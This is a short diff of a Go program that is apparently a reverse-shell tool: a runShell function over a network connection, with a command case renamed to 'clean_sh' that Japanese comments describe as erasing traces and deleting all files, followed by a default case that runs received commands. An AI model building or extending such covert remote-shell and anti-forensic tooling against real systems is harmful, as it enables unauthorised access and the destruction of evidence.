@@ -320,12 +320,14 @@ func runShell(conn net.Conn) error {
 				log.Println(err)
 			}
 
-		case "clean_go_reversh": //痕跡消去 ex: clean_go_reversh
+		case "clean_sh": //痕跡消去 ex: clean_go_reversh
 			//tips/main11.goを参考
 			fmt.Println("CLEAN")
 
 			//clean flagをつけて、正常終了
 			//その後、コマンドでファイルを全消去する
+
+			os.Exit(0)
 
 		default:
 			var cmd *exec.Cmd
